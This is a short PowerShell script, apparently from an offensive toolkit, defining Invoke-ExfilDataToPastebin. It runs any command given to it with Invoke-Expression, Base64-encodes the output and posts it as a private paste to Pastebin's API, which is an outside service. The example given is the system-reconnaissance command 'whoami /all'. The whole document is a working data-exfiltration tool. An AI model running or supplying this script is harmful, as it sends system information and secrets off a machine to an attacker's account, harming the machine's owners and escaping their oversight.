function Invoke-ExfilDataToPastebin {

<#

.SYNOPSIS 
Use this script to exfiltrate command output to a Pastebin account. 
Documentation for Pastebin's API:
https://pastebin.com/doc_api


.DESCRIPTION

.PARAMETER ApiDevKey
Pastebin developer key

.PARAMETER Command
Command to execute


.EXAMPLE
# This example exfiltrates data to a file - keys do not work

Invoke-ExfilDataToPastebin -ApiDevKey $ApiDevKey -ApiUserKey $ApiUserKey -Command "whoami /all"

#>

    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ApiDevKey,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $ApiUserKey,

        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $Command
    )

    $ApiOption = "paste"
    $Code = Invoke-Expression $Command
    $CodeBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Code))
    $ApiPasteCode = $CodeBase64.Replace('+', '-').Replace('/', '_').Replace('=', '')
    $ApiPastePrivate = 2

    $postParams = "api_option=$ApiOption&api_dev_key=$ApiDevKey&api_paste_code=$ApiPasteCode&api_paste_private=$ApiPastePrivate&api_user_key=$ApiUserKey"

    Invoke-WebRequest -UseBasicParsing "https://pastebin.com/api/api_post.php" -ContentType "application/x-www-form-urlencoded" -Method POST -Body $postParams
}
